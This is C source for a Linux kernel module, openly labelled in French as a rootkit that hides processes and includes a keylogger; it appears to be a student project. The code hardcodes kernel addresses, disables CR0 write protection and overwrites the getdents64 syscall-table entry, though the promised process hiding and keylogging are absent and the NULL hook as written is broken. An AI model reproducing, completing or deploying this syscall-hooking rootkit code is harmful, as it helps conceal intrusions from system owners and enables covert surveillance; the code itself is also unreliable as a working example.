#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("RUCKTOOA THOMAS ET Ariel Perez");
MODULE_DESCRIPTION("Rootkit qui cache les processus et keylogger intégré");

static unsigned long *syscall_table = NULL;
static unsigned long (*my_kallsyms_lookup_name)(const char *name) = NULL;

asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent64 __user *, unsigned int);

static int __init rootkit_init(void) {
    unsigned long cr0;

    printk(KERN_INFO "rootkit_init : Début\n");

    // Utilisation de l'adresse statique pour kallsyms_lookup_name
    my_kallsyms_lookup_name = (unsigned long (*)(const char *))0xffffffffa419fd90;
    if (!my_kallsyms_lookup_name) {
        printk(KERN_ALERT "Erreur : kallsyms_lookup_name non définie\n");
        return -1;
    }
    printk(KERN_INFO "kallsyms_lookup_name trouvé : %p\n", my_kallsyms_lookup_name);

    // Utilisation de l'adresse statique pour sys_call_table
    syscall_table = (unsigned long *)0xffffffffa5200320;
    if (!syscall_table || !access_ok((void *)syscall_table, sizeof(unsigned long))) {
        printk(KERN_ALERT "Erreur critique : sys_call_table introuvable ou inaccessible : %p\n", syscall_table);
        return -1;
    }
    printk(KERN_INFO "sys_call_table trouvée : %p\n", syscall_table);

    // Validation de l'entrée dans la sys_call_table
    if (!access_ok((void *)syscall_table[__NR_getdents64], sizeof(unsigned long))) {
        printk(KERN_ALERT "Erreur : Entrée sys_call_table[__NR_getdents64] invalide\n");
        return -1;
    }
    printk(KERN_INFO "Entrée sys_call_table[__NR_getdents64] valide : %p\n", (void *)syscall_table[__NR_getdents64]);

    // Hook de getdents64
    cr0 = read_cr0();
    write_cr0(cr0 & ~0x10000);
    original_getdents = (void *)syscall_table[__NR_getdents64];
    syscall_table[__NR_getdents64] = (unsigned long)NULL; // Exemple d'injection temporaire
    write_cr0(cr0);

    printk(KERN_INFO "rootkit_init : Fin\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    unsigned long cr0;

    printk(KERN_INFO "rootkit_exit : Début\n");

    cr0 = read_cr0();
    write_cr0(cr0 & ~0x10000);
    syscall_table[__NR_getdents64] = (unsigned long)original_getdents;
    write_cr0(cr0);

    printk(KERN_INFO "Rootkit déchargé\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
